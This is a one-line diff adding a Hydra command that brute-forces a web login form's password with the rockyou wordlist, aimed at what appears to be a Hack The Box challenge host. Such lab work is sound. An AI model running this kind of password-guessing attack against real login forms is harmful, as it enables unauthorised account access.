@@ -1,0 +1,1 @@
+hydra -l test -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu -s 32655 http-post-form "/:password=^PASS^:Wrong password!" 
